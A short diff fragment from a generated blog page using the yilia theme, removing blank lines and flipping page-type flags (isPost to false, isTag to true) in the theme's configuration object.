-                                
-
-                                            
-
-                                                        
-
-                                                                
-                                                                            
           </div>
         </div>
       </div>
@@ -456,9 +260,9 @@ var _hmt = _hmt || [];
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
